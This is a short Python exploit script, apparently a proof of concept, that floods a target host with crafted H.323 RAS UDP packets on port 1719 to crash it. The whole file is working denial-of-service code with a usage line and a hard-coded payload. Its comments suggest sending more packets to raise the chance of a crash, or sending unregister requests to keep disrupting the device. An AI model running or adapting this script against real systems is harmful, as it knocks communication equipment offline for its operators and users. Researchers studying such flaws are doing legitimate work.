#-----------No error detection\ success confirmation ]\                    
#						      /
#		                -otk  _______________/
		
import socket, sys

if len(sys.argv)!= 3:
	print "\n[*] Usage: %s <ip> <port>\n" % sys.argv[0]
	sys.exit(0)

host = sys.argv[1]
port = int(sys.argv[2]) 	#port 1719 by default

pkt = (	
	"\x18\x40\xf9\x12\x01\x00\xc0\xa8" 
	"\x01\x23\x06\xb8\x4a\x00\x32\x00" 
	"\x33\x00\x64\x00\x66\x00\x35\x00" 
	"\x35\x00\x39\x00\x65\x00\x2d\x00" 
	"\x31\x00\x65\x00\x61\x00\x66\x00"
	"\x2d\x00\x31\x00\x31\x00\x62\x00" 
	"\x32\x00\x2d\x00\x61\x00\x38\x00" 
	"\x39\x00\x35\x00\x2d\x00\x30\x00" 
	"\x30\x00\x31\x00\x30\x00\x66\x00"
	"\x33\x00\x31\x00\x38\x00\x65\x00" 
	"\x64\x00\x30\x00\x62\x00\x5f\x00" 
	"\x62")

print "[+] Connecting to %s on port %d" % (host,port)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

i = 0
while(1): 
  i += 1				
  if (i <= 6000):                            #Change to increase possibility of crash
     data =  s.sendto ( pkt, ((host,port)) ) 
     print "[+] Sending packet"              #remove this if you don't like spam
  else:                                      #You could also change this area to send a slow 						     #interval RAS URQ, essentially unregistering 
					     #the unit constantly, this wouldn't shut it 
					     #down but would be very annoying.
     break

print "[+] done, if host is still up you lost, check tcpdump\n"
